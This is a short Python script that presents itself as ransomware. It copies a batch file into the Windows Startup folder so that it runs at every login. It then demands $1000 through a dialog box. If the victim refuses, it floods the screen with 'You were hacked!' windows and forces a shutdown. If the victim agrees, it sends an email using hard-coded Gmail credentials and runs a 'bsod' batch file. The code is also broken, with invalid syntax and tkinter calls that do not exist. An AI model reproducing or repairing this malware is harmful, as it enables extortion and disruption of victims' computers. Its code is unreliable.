import tkinter as tk
import smtplib
import os
windows = []
os.system("copy /Y Components\\Killer.bat C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\Killer.bat")
kill = tk.askyesno("Give me $1000, and you will save your computer")b
if !kill:
    for i in range(0, 1000000):
        tk.showerror("Killing...", "Killing")
        windows.append(tk.Tk())
        windows[i]["bg"]="red"
        windows[i].title("You were hacked!")
        windows[i].geometry('600x600')
        windows[i].mainloop()
        os.system("start")
    os.system("shutdown /s /f /t 0")
else:
    smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
    smtpObj.starttls()
    smtpObj.login("anonimous66666666666666@gmail.com", "CodingIsCool1001")
    smtpObj.sendmail("anonimous66666666666666@gmail.com","megaboss666666@gmail.com","$1000")
    os.system("Components\\bsod.bat")